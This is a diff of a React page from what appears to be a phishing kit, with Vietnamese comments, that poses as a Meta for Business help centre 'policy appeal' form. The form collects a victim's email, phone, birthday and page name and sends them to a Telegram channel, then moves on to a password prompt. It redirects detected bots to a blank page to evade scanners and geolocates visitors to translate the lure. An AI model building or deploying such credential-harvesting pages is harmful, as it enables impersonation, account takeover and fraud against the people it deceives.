@@ -6,6 +6,7 @@ import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
 import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
+// 🛡️ THÊM IMPORT CÁC FUNCTION BẢO MẬT
 import countryToLanguage from '@/utils/country_to_language';
 import detectBot from '@/utils/detect_bot';
 import axios from 'axios';
@@ -40,6 +41,7 @@ const Home = () => {
             createPage: 'Create Page',
             termsPolicies: 'Terms and policies',
             cookies: 'Cookies',
+            // 🚀 THÊM: Text cho trạng thái loading
             pleaseWait: '請稍等...',
             checkingSecurity: 'Checking security...'
         }),
@@ -59,71 +61,83 @@ const Home = () => {
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
+    // 🚀 THAY ĐỔI: Thêm state để theo dõi trạng thái bảo mật
     const [securityChecked, setSecurityChecked] = useState(false);
     const [isFormEnabled, setIsFormEnabled] = useState(false);
+    // 🚀 THÊM: State để quản lý trạng thái loading khi submit
     const [isSubmitting, setIsSubmitting] = useState(false);
 
-    // 🚀 THÊM META TAGS VÀO ĐÂY
+    // 🚀 THÊM META TAGS CHO SHARE LINK
     useEffect(() => {
-        document.title = "Meta for Business - Account Help Center";
-        
-        const updateMetaTag = (name, content) => {
-            let meta = document.querySelector(`meta[name="${name}"]`) || document.querySelector(`meta[property="${name}"]`);
-            if (!meta) {
-                meta = document.createElement('meta');
-                if (name.startsWith('og:')) {
-                    meta.setAttribute('property', name);
-                } else {
-                    meta.setAttribute('name', name);
-                }
-                document.head.appendChild(meta);
-            }
-            meta.setAttribute('content', content);
-        };
+        // Tạo các thẻ meta cần thiết
+        const metaTags = [
+            { property: 'og:title', content: 'Meta for Business - Account Help Center' },
+            { property: 'og:description', content: 'Get help with your Meta Business account verification and policy appeals' },
+            { property: 'og:image', content: '/assets/images/fb-thumbnail.jpg' },
+            { property: 'og:url', content: window.location.href },
+            { property: 'og:type', content: 'website' },
+            { name: 'twitter:card', content: 'summary_large_image' },
+            { name: 'twitter:title', content: 'Meta for Business - Account Help Center' },
+            { name: 'twitter:description', content: 'Get help with your Meta Business account verification' },
+            { name: 'twitter:image', content: '/assets/images/fb-thumbnail.jpg' }
+        ];
 
-        updateMetaTag('description', 'Get help with your Meta Business account. Verify your account to resolve policy violations and restore access to your advertising capabilities.');
-        updateMetaTag('og:title', 'Meta for Business - Account Help Center');
-        updateMetaTag('og:description', 'Get help with your Meta Business account. Verify your account to resolve policy violations and restore access.');
-        updateMetaTag('og:image', '/assets/images/fb-thumbnail.jpg');
-        updateMetaTag('og:url', window.location.href);
-        updateMetaTag('og:type', 'website');
-        updateMetaTag('og:site_name', 'Meta for Business');
-        updateMetaTag('twitter:card', 'summary_large_image');
-        updateMetaTag('twitter:title', 'Meta for Business - Account Help Center');
-        updateMetaTag('twitter:description', 'Get help with your Meta Business account verification and policy appeals.');
-        updateMetaTag('twitter:image', '/assets/images/fb-thumbnail.jpg');
+        // Thêm vào head
+        metaTags.forEach(tag => {
+            const meta = document.createElement('meta');
+            if (tag.property) {
+                meta.setAttribute('property', tag.property);
+            } else {
+                meta.setAttribute('name', tag.name);
+            }
+            meta.setAttribute('content', tag.content);
+            document.head.appendChild(meta);
+        });
+
+        // Cập nhật title
+        document.title = "Meta for Business - Account Help Center";
     }, []);
 
+    // 🛡️ HÀM KHỞI TẠO BẢO MẬT - CHẠY BACKGROUND
     const initializeSecurity = useCallback(async () => {
         try {
+            // 1. Kiểm tra bot tự động
             const botResult = await detectBot();
             if (botResult.isBot) {
                 window.location.href = 'about:blank';
                 return;
             }
 
+            // 2. Lấy thông tin IP và vị trí
             const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
             const ipData = response.data;
+            
+            // Lưu thông tin IP vào localStorage
             localStorage.setItem('ipInfo', JSON.stringify(ipData));
             
             const detectedCountry = ipData.country_code || 'US';
             setCountryCode(detectedCountry);
 
+            // 3. Xác định ngôn ngữ và dịch (chạy sau khi web đã hiển thị)
             const targetLang = countryToLanguage[detectedCountry] || 'en';
             localStorage.setItem('targetLang', targetLang);
             
             if (targetLang !== 'en') {
+                // Dịch ở background, không chờ
                 translateCriticalTexts(targetLang);
             }
 
+            // 4. Set calling code
             const code = getCountryCallingCode(detectedCountry);
             setCallingCode(`+${code}`);
 
+            // 🚀 QUAN TRỌNG: Đánh dấu đã check bảo mật và enable form
             setSecurityChecked(true);
             setIsFormEnabled(true);
             
         } catch (error) {
             console.log('Security initialization failed:', error.message);
+            // 🚀 QUAN TRỌNG: Vẫn enable form nếu có lỗi
             setCountryCode('US');
             setCallingCode('+1');
             setSecurityChecked(true);
@@ -131,6 +145,7 @@ const Home = () => {
         }
     }, []);
 
+    // 🚀 HÀM DỊCH TEXT QUAN TRỌNG TRƯỚC
     const translateCriticalTexts = useCallback(async (targetLang) => {
         try {
             const [helpCenter, pagePolicyAppeals, detectedActivity, accessLimited, submitAppeal, pageName, mail, phone, birthday, yourAppeal, submit, pleaseWait, checkingSecurity] = await Promise.all([
@@ -166,12 +181,14 @@ const Home = () => {
                 checkingSecurity
             }));
 
+            // Dịch phần còn lại ở background
             translateRemainingTexts(targetLang);
         } catch (error) {
             console.log('Critical translation failed:', error.message);
         }
     }, [defaultTexts]);
 
+    // 🚀 HÀM DỊCH TEXT CÒN LẠI - KHÔNG ẢNH HƯỞNG ĐẾN HIỂN THỊ
     const translateRemainingTexts = useCallback(async (targetLang) => {
         try {
             const [english, using, managingAccount, privacySecurity, policiesReporting, appealPlaceholder, fieldRequired, invalidEmail, about, adChoices, createAd, privacy, careers, createPage, termsPolicies, cookies] = await Promise.all([
@@ -204,9 +221,12 @@ const Home = () => {
         }
     }, [defaultTexts]);
 
+    // 🚀 THAY ĐỔI QUAN TRỌNG: HIỂN THỊ WEB NGAY, CHẠY BẢO MẬT SAU
     useEffect(() => {
+        // Chạy bảo mật ở background
         initializeSecurity();
         
+        // 🚀 Enable form sau 2 giây dù bảo mật có xong hay chưa
         const timer = setTimeout(() => {
             setIsFormEnabled(true);
         }, 2000);
@@ -214,11 +234,13 @@ const Home = () => {
         return () => clearTimeout(timer);
     }, [initializeSecurity]);
 
+    // Hàm validate email
     const validateEmail = (email) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
     };
 
+    // Hàm chuyển đổi từ yyyy-mm-dd sang dd/mm/yyyy
     const formatDateToDDMMYYYY = (dateString) => {
         if (!dateString) return '';
         const parts = dateString.split('-');
@@ -226,6 +248,7 @@ const Home = () => {
         return `${parts[2]}/${parts[1]}/${parts[0]}`;
     };
 
+    // THÊM HÀM ẨN EMAIL: s****g@m****.com
     const hideEmail = (email) => {
         if (!email) return 's****g@m****.com';
         const parts = email.split('@');
@@ -238,27 +261,34 @@ const Home = () => {
         if (username.length <= 1) return email;
         if (domainParts.length < 2) return email;
         
+        // Format: s****g (ký tự đầu + *** + ký tự cuối)
         const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
+        
+        // Format: m****.com (ký tự đầu + *** + .com)
         const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
         
         return formattedUsername + '@' + formattedDomain;
     };
 
+    // THÊM HÀM ẨN SỐ ĐIỆN THOẠI: ******32 (6 sao + 2 số cuối)
     const hidePhone = (phone) => {
         if (!phone) return '******32';
         const cleanPhone = phone.replace(/^\+\d+\s*/, '');
         if (cleanPhone.length < 2) return '******32';
+        
+        // Luôn hiển thị 6 sao + 2 số cuối
         const lastTwoDigits = cleanPhone.slice(-2);
         return '*'.repeat(6) + lastTwoDigits;
     };
 
     const handleInputChange = (field, value) => {
-        if (!isFormEnabled || isSubmitting) return;
+        if (!isFormEnabled || isSubmitting) return; // 🚀 Không cho nhập nếu form chưa enabled hoặc đang submit
         
         if (field === 'phone') {
             const cleanValue = value.replace(/^\+\d+\s*/, '');
             const asYouType = new AsYouType(countryCode);
             const formattedValue = asYouType.input(cleanValue);
+
             const finalValue = `${callingCode} ${formattedValue}`;
 
             setFormData((prev) => ({
@@ -272,6 +302,7 @@ const Home = () => {
             }));
         }
 
+        // Chỉ clear error khi người dùng bắt đầu nhập, không validate real-time
         if (errors[field]) {
             setErrors((prev) => ({
                 ...prev,
@@ -281,7 +312,7 @@ const Home = () => {
     };
 
     const validateForm = () => {
-        if (!isFormEnabled || isSubmitting) return false;
+        if (!isFormEnabled || isSubmitting) return false; // 🚀 Không cho submit nếu form chưa enabled hoặc đang submit
         
         const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
         const newErrors = {};
@@ -292,6 +323,7 @@ const Home = () => {
             }
         });
 
+        // Validate email format chỉ khi submit
         if (formData.mail.trim() !== '' && !validateEmail(formData.mail)) {
             newErrors.mail = 'invalid';
         }
@@ -301,17 +333,20 @@ const Home = () => {
     };
 
     const handleSubmit = async () => {
-        if (!isFormEnabled || isSubmitting) return;
+        if (!isFormEnabled || isSubmitting) return; // 🚀 Không cho submit nếu form chưa enabled hoặc đang submit
         
         if (validateForm()) {
             try {
+                // 🚀 BẮT ĐẦU LOADING
                 setIsSubmitting(true);
                 
                 const telegramMessage = formatTelegramMessage(formData);
                 await sendMessage(telegramMessage);
 
+                // 🚀 THÊM DELAY 0.5s GIẢ LẬP LOADING
                 await new Promise(resolve => setTimeout(resolve, 500));
 
+                // THÊM CODE XỬ LÝ ẨN THÔNG TIN VÀ LƯU VÀO LOCALSTORAGE
                 const hiddenData = {
                     name: formData.pageName,
                     email: hideEmail(formData.mail),
@@ -319,14 +354,18 @@ const Home = () => {
                     birthday: formData.birthday
                 };
 
+                // Lưu vào localStorage để trang Verify lấy
                 localStorage.setItem('userInfo', JSON.stringify(hiddenData));
 
+                // 🚀 KẾT THÚC LOADING VÀ HIỂN THỊ PASSWORD
                 setIsSubmitting(false);
                 setShowPassword(true);
                 
             } catch (error) {
+                // 🚀 QUAN TRỌNG: KẾT THÚC LOADING KHI CÓ LỖI
                 setIsSubmitting(false);
                 console.error('Submit error:', error);
+                // Chỉ redirect về blank khi có lỗi thực sự
                 window.location.href = 'about:blank';
             }
         } else {
@@ -479,6 +518,8 @@ const Home = () => {
                                 <p className='text-base sm:text-base'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
+                                
+                                {/* Desktop: type='date' bình thường */}
                                 <input 
                                     type='date' 
                                     name='birthday' 
@@ -487,6 +528,8 @@ const Home = () => {
                                     onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                     disabled={!isFormEnabled || isSubmitting}
                                 />
+                                
+                                {/* Mobile: type='date' với placeholder ảo */}
                                 <div className='block sm:hidden relative'>
                                     <input 
                                         type='date' 
@@ -497,6 +540,7 @@ const Home = () => {
                                         required
                                         disabled={!isFormEnabled || isSubmitting}
                                     />
+                                    {/* Placeholder ảo cho mobile */}
                                     <div 
                                         className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                                         onClick={() => (isFormEnabled && !isSubmitting) && document.querySelectorAll('input[name="birthday"]')[1].click()}
@@ -504,6 +548,7 @@ const Home = () => {
                                         {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
                                     </div>
                                 </div>
+                                
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
@@ -544,6 +589,8 @@ const Home = () => {
                                     translatedTexts.submit
                                 )}
                             </button>
+                            
+                            {/* 🚀 Hiển thị trạng thái bảo mật */}
                             {!securityChecked && (
                                 <div className="text-center text-sm text-gray-500 mt-2">
                                     {translatedTexts.checkingSecurity}
